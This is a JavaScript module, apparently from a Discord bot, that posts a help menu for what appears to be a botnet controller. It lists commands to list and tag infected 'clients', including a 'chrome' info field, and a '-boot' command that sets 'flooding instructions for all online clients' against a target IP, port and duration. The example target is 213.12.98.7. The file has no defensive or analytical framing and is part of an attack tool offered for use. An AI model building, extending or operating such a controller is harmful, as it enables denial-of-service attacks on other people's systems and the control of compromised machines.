exports.run = (client, message) => {
    message.channel.send(`\`\`\`
-help 
    Shows this command

-clients [ID || Tag] [info field]
    Shows clients or info about them
    Examples:
        ${client.settings.fallbackPrefix}clients
        ${client.settings.fallbackPrefix}clients 9
        ${client.settings.fallbackPrefix}clients MyTag
        ${client.settings.fallbackPrefix}clients 4 chrome
    
-tag <ID> <TagName>
    Sets tag to a spceffic client
    Examples:
        ${client.settings.fallbackPrefix}tag 12 workstation3

-boot <IP Address || Parameter> [Port>] [Duration in minutes]
    Sets flooding instrctions for all online clients
    Examples:
        ${client.settings.fallbackPrefix}boot 213.12.98.7 8080 5
        ${client.settings.fallbackPrefix}boot status /shows the boot instructions
        ${client.settings.fallbackPrefix}boot stop /removes the boot instructions
    \`\`\``);
};
